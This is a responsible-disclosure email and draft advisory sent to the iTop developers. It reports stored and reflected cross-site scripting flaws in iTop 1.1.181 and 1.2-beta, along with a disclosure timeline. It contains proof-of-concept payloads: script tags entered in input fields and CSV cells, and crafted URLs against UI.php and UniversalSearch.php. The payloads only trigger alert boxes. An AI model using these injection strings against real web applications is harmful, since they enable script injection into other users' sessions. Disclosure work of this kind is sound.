1.1.181.

According to our disclosure policy, we inform you hereby about the
vulnerabilities in detail before disclosing any information to the public=
.
Due to the experiences in the past, we will stick to the following time
schedule:
 - no response from you until 2011/09/03: disclosure to the public
 - response from you: disclosure to the public after a security fix is
released, but latest on 2011/11/29 (maybe extended according to further
agreements during the disclosure process)

We respect your work and do support open source projects, so feel free to
ask us for more information of you need one.

I just saw you published 1.2-beta today. It seems you have the same
problems here, as this one works on 1.1 and 1.2-beta:

TC-SA-2011-0X: Multiple web-vulnerabilities in iTop version 1.1.181

Published: 2011/0X/XX
Version 1.0

Affected products:
    iTop version 1.1.181 (maybe earlier versions as well)
    http://sourceforge.net/projects/itop/

Summary:
    IT Operations Portal: a complete open source, ITIL, web based
    service management tool including a fully customizable CMDB,
    a helpdesk system and a document management tool.
    Several common flaws could be found in iTop like reflected
    and stored XSS.

Vulnerable Scripts:
    stored XSS:
     - almost every tested input field stored in database and in the
html-content of the site.
	   Especially in case data is reformatted using Javascript, the
sanitisation in place
	   seems to be overridden.

    reflected XSS:
     - almost every test input field where the value is reflected in
servers output

Examples:
    stored XSS:
	  - add a company named "XSS <script>alert("Help Me")</script>"
	  - add a database server named "XSS <script>alert("Help
Me")</script>"
	  - import a CSV-File where one cell contains "XSS
<script>alert("Help Me")</script>"
	  - copy&paste data (which does the same as CSV-import) using
	    1;Test 1
        2;Test 2
        3;Test 3<script>alert("23746234243 Test")</script>"

    reflected XSS (un-authenticated):

http://$domain/iTop/pages/UI.php?auth_user=3Dadmin"><script>alert("Help
Me")</script><lala=3D"&suggest_pwd=3Dadmin

    reflected XSS (authenticated):

http://$domain/iTop/pages/UI.php?auth_user=3Dadmin"><script>alert("Help
Me")</script><lala=3D"&suggest_pwd=3Dadmin

http://$domain/iTop/pages/UniversalSearch.php?c[menu]=3D"<script>alert("H=
elp
Me")</script>"

http://$domain/iTop/pages/UI.php?c%5bmenu%5d=3D60&class=3DNote&currentId=3D=
Searc
hFormToAdd_document_list\
	   &description=3D"<script>alert("Help
Me")</script>"&dosearch=3D1&name=3DAcunetix&open=3D1&operation=3Dsearch\
	   _form&org_id=3D3&status=3Ddraft&type=3Dcontract

/script%3E%22&operation=3Derrors&rule=3D1

Possible solutions:
    - sanitize all input
